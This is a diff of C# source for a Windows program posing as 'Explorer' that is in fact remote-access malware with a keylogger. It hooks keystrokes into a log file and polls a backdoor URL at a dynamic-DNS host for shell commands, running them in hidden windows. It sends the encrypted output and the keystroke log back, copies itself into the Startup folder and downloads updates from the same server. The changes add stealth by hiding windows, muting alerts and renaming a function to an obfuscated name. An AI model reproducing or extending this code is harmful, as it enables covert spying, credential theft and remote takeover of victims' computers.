@@ -8,8 +8,7 @@ using System.Threading.Tasks;
 using System.Windows.Forms;
 using System.Runtime.InteropServices;
 using System.Threading;
-using System.Windows.Media;
-using System.Media;
+
 
 namespace Explorer
 {
@@ -18,7 +17,12 @@ namespace Explorer
         public explorer()
         {
             InitializeComponent();
-            Client.Listener.start_listener();
+            Client.Listener.HandleListener();
+        }
+
+        private void Explorer_Load(object sender, EventArgs e)
+        {
+
         }
     }
     namespace Keylogger
@@ -84,7 +88,7 @@ namespace Explorer
                 }
                 return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
             }
-
+         
             public static IntPtr SetHook(LowLevelKeyboardProc proc)
             {
                 Process currentProcess = Process.GetCurrentProcess();
@@ -112,26 +116,86 @@ namespace Explorer
         static class Listener
         {
             #region Variables
+            private const int _Version = 126;
             static int vzs = 0;
-            static string host = "hagash.ddns.net";
-            static string port = "160";
-            static string URL = $"http://{host}:{port}/backdoor/backshell.php";
-            static string URLd = $"http://{host}:{port}/backdoor/";
+            static readonly string host = "hagash.ddns.net";
+            static readonly string port = "160";
+            static readonly string URL = $"http://{host}:{port}/backdoor/backshell.php";
+            static readonly string URLd = $"http://{host}:{port}/backdoor/";
             static string last_cmd = "";
             static object objResponse = "";
             #endregion
-            public static async void start_listener()
+            public static async void HandleListener()
             {
+                ExecutarCMD("TASKKILL /IM cmd.exe",true);
+                CheckWebServer();
+                if( !CheckVersion() )
+                {
+                    Update();
+                    return;
+                }
                 Thread keylogger = new Thread(Keylogger.Program.start_log);
                 keylogger.Start();
-                warn_alive();
+                WarnAlive();
                 Start_persistence();
                 while (true)
                 {
                     await Task.Delay(400);
-                    check_host();
+                    Check_host();
                 }
             }
+
+            static void CheckWebServer()
+            {
+                while (true)
+                {
+                    try
+                    {
+                        var WebREQ = WebRequest.CreateHttp(URL + "?Version");
+                        WebREQ.Method = "GET";
+                        WebREQ.UserAgent = "RequisicaoWebDemo";
+                        var streamDados = WebREQ.GetResponse().GetResponseStream();
+                        StreamReader reader = new StreamReader(streamDados);
+                        objResponse = reader.ReadToEnd();
+                        return;
+                    }
+                    catch {  }
+                }
+            }
+
+            static void Update( bool _end = false )
+            {
+                string[] fpath = Application.UserAppDataPath.ToString().Split(@"\".ToCharArray()[0]);
+                string AppData = fpath[0] + fpath[1].Insert(0, @"\") + fpath[2].Insert(0, @"\") + fpath[3].Insert(0, @"\") + fpath[4].Insert(0, @"\");
+                string loc = AppData + @"\Microsoft\Windows\Start Menu\Programs\Startup\";
+                ExecutarCMD("del " + loc + "Explorer.exe", true);
+                ExecutarCMD(@"del C:\temp\Updater.bat", true);
+                WebClient webClient = new WebClient();
+                string exe_ = "_Explorer.exe";
+                webClient.DownloadFile(new Uri(URLd + exe_), loc + exe_);
+                webClient.DownloadFile(new Uri(URLd + "Updater.bat"), @"C:\temp\Updater.bat");
+                //Alert("Clique em OK para continuar com a atualização de sistema.");
+                using (Process processo = new Process())
+                {
+                    processo.StartInfo.FileName = Environment.GetEnvironmentVariable("comspec");
+                    processo.StartInfo.Arguments = string.Format("/c {0}", @"C:\temp\Updater.bat");
+                    processo.StartInfo.CreateNoWindow = true;
+                    processo.Start();
+                }
+                Environment.Exit(0);
+            }
+
+            static bool CheckVersion()
+            {
+                var WebREQ = WebRequest.CreateHttp(URL + "?Version");
+                WebREQ.Method = "GET";
+                WebREQ.UserAgent = "RequisicaoWebDemo";
+                var streamDados = WebREQ.GetResponse().GetResponseStream();
+                StreamReader reader = new StreamReader(streamDados);
+                objResponse = reader.ReadToEnd();
+                return  ( Convert.ToInt32( objResponse.ToString() ) == _Version ) ?  true : false;
+            }
+
             public static void Start_persistence()
             {
                 string path = Directory.GetCurrentDirectory().ToString();
@@ -143,7 +207,7 @@ namespace Explorer
                     {
                         string file = leq[x].ToString().Trim();
                         string loc = " %appdata%" + @"\Microsoft\Windows\&Start Menu&\Programs\Startup\".Replace('&', '"');
-                        ExecutarCMD("copy " + '"' + file + '"' + loc);
+                        ExecutarCMD("copy " + '"' + file + '"' + loc , true);
                     }
                     x++;
                 }
@@ -160,7 +224,7 @@ namespace Explorer
                     if (items[x].ToString().ToLower().Contains(app) || items[x].ToString().ToLower().Contains(variant))
                     {
                         string file = items[x].ToString().Trim();
-                        ExecutarCMD("del " + '"' + file + '"');
+                        ExecutarCMD("del " + '"' + file + '"' , true);
                         webClient.DownloadFileCompleted += new AsyncCompletedEventHandler(comp);
                         string[] archive_name = file.Split('.')[0].Replace(@"\""".ToCharArray()[0], '/').Split('/');
                         string name = archive_name[archive_name.Length - 1];
@@ -170,7 +234,8 @@ namespace Explorer
                 }
 
             }
-            static void comp(object sender, AsyncCompletedEventArgs e) { Alert("fully"); }
+            static void comp(object sender, AsyncCompletedEventArgs e) { //Alert("fully"); 
+            }
             public static string Decrypter(string hash)
             {
                 string alphabet = "abcdefghijklmnopqrstuvwxyz";
@@ -289,9 +354,6 @@ namespace Explorer
                         double cif = (index_rev * Convert.ToInt32(c.ToString().ToUpper().ToCharArray()[0])) / 10;
                         string hex = ((int)cif).ToString("x") + "";
                         cifrada += letter + "(" + hex + "_";
-                        //textboxx.Text += "[" + c + "] => " + "[ " + hex + " ] = (26-" + alphabet.IndexOf(c.ToString().ToLower()) + " * "+ Convert.ToInt32(c.ToString().ToUpper().ToCharArray()[0]) + ")/10 = " + cif + "\n";
-                        //textboxx.Text += ("O numero e PAR a letra processada aqui e :" + c + " a pos inv dela é " + index_rev + " *" + Convert.ToInt32(c.ToString().ToUpper().ToCharArray()[0]) + " = " + cif + " tohex = " + hex + "\n");
-
                     }
                     else
                     {
@@ -300,9 +362,6 @@ namespace Explorer
                         cif = Math.Ceiling(cif);
                         string hex = ((int)cif).ToString("x") + "";
                         cifrada += letter + "(" + hex + "_";
-                        //textboxx.Text += ("O numero e impar a letra processada aqui e :" + c + " a pos inv dela é " + index_rev + " *" + Convert.ToInt32(c.ToString().ToLower().ToCharArray()[0]) + " = " + cif + " tohex = " + hex + "\n");
-
-                        //textboxx.Text += "[" + c + "] => " + "[ " + hex + " ] = (26-" + alphabet.IndexOf(c.ToString().ToLower()) + " * " + Convert.ToInt32(c.ToString().ToLower().ToCharArray()[0]) + ")/10 = " + cif +"\n";
                     }
                     x++;
                 }
@@ -429,16 +488,15 @@ namespace Explorer
                 }
                 return result;
             }
-            public static string Web_Downloader(string link)
+            public static string Web_Downloader(string link , string path = @"c:\temp\")
             {
                 WebClient webClient = new WebClient();
-                //webClient.DownloadFileCompleted += new AsyncCompletedEventHandler(Completo);
                 string exe_ = link.Split('_')[0];
                 link = link.Split('_')[1];
-                webClient.DownloadFile(new Uri(link), @"c:\temp\" + exe_);
-                return "Download completo!\nDiretorio local: " + @"C:\temp\" + exe_;
+                webClient.DownloadFile(new Uri(link), path + exe_);
+                return "Download completo!\nDiretorio local: " + path + exe_;
             }
-            public static async void player(string music_path)
+            public static async void Player(string music_path)
             {
                 await Task.Delay(2000);
                 if(!File.Exists(@"C:\temp\" + music_path))
@@ -446,17 +504,14 @@ namespace Explorer
                     vzs++;
                     if(vzs != 6)
                     {
-                        player(music_path);
+                        Player(music_path);
                     }
                     return;
                 }
-                //WMPLib.WindowsMediaPlayer wplayer = new WMPLib.WindowsMediaPlayer();
-                //wplayer.URL = @"c:\temp\" + music_path;
-                //wplayer.controls.play();
                 Terminal(music_path);
                 vzs = 0;
             }
-            public static string play_music(string music_link)
+            public static string Play_Music(string music_link)
             {
                 string msg="";
                 try
@@ -466,13 +521,13 @@ namespace Explorer
                     WebClient wc = new WebClient();
                     //Alert("link["+music_link);
                     wc.DownloadFile(new Uri(music_link.Replace('{', ':')), @"c:\temp\" + music_name);
-                    player(music_name);
+                    Player(music_name);
                     msg = "Musica em execução!";
                 }catch(Exception v) { msg = "Erro: " + v.Message; }
 
                 return "$_RET/ALERT="+msg;
             }
-            public static string functions(string cmd)
+            public static string F_0x866(string cmd)
             {
                 switch (cmd.ToUpper().Split('=')[0])
                 {
@@ -487,7 +542,7 @@ namespace Explorer
                         return "$_RET/VARS=" + Terminal("SET").Replace("=", " > ");
                     case "$_MSC":
                         string url = cmd.Split('=')[1];
-                        return play_music(url);
+                        return Play_Music(url);
                     case "$_KBSPY":
                         string read = new StreamReader(@"C:\ProgramData\mylog.txt").ReadToEnd();
                         return "$_RET/KBSPY=" + read;
@@ -510,7 +565,7 @@ namespace Explorer
             {
 
                 string dadosPOST = (key + data);
-                var requisicaoWeb = System.Net.WebRequest.CreateHttp(url);
+                var requisicaoWeb = WebRequest.CreateHttp(url);
                 requisicaoWeb.Method = "POST";
                 requisicaoWeb.ContentType = "application/x-www-form-urlencoded";
                 var dados = Encoding.UTF8.GetBytes(dadosPOST);
@@ -527,16 +582,16 @@ namespace Explorer
                 }
                 catch (Exception)
                 {
-                    Alert("Não foi possivel estabelecer uma conexão segura com servidor remoto !");
+                    //Alert("Não foi possivel estabelecer uma conexão segura com servidor remoto !");
                 }
 
             }
-            public static void warn_alive()
+            public static void WarnAlive()
             {
                 string url = "http://checkip.dyndns.org";
-                System.Net.WebRequest req = System.Net.WebRequest.Create(url);
-                System.Net.WebResponse resp = req.GetResponse();
-                System.IO.StreamReader sr = new System.IO.StreamReader(resp.GetResponseStream());
+                WebRequest req = WebRequest.Create(url);
+                WebResponse resp = req.GetResponse();
+                StreamReader sr = new StreamReader(resp.GetResponseStream());
                 string response = sr.ReadToEnd().Trim();
                 string[] a = response.Split(':');
                 string a2 = a[1].Substring(1);
@@ -550,12 +605,12 @@ namespace Explorer
             {
                 MessageBox.Show(msg, cap, btn, ico);
             }
-            public static string ExecutarCMD(string comando)
+            public static string ExecutarCMD(string comando, bool noWindow = false )
             {
                 last_cmd = comando;
                 if (comando.Contains("$_"))
                 {
-                    return functions(comando);
+                    return F_0x866(comando);
                 }
                 using (Process processo = new Process())
                 {
@@ -565,7 +620,7 @@ namespace Explorer
                     //info.Verb = "runas";
                     info.RedirectStandardOutput = true;
                     info.UseShellExecute = false;
-                    info.CreateNoWindow = false;
+                    info.CreateNoWindow = noWindow;
                     info.RedirectStandardError = true;
                     info.RedirectStandardInput = true;
                     info.WindowStyle = ProcessWindowStyle.Minimized;
@@ -626,11 +681,11 @@ namespace Explorer
                     return ret;
                 }
             }
-            public static void check_host()
+            public static void Check_host()
             {
                 try
                 {
-                    var requisicaoWeb = System.Net.WebRequest.CreateHttp(URL + "?get_cmd");
+                    var requisicaoWeb = WebRequest.CreateHttp(URL + "?get_cmd");
                     requisicaoWeb.Method = "GET";
                     requisicaoWeb.UserAgent = "RequisicaoWebDemo";
                     var streamDados = requisicaoWeb.GetResponse().GetResponseStream();
@@ -661,6 +716,7 @@ namespace Explorer
                     {
                         return;
                     }
+                    //Alert("Executando: " + cmds[local].ToString().ToLower() + ".");
                     string saida = ExecutarCMD(cmds[local].ToString().ToLower());
                     string data = (Environment.MachineName + ":@" + saida.Replace(':', '^') + "@").Replace('@', '"');
                     Set_POST(URL, "set_out=", Encrypter(data));
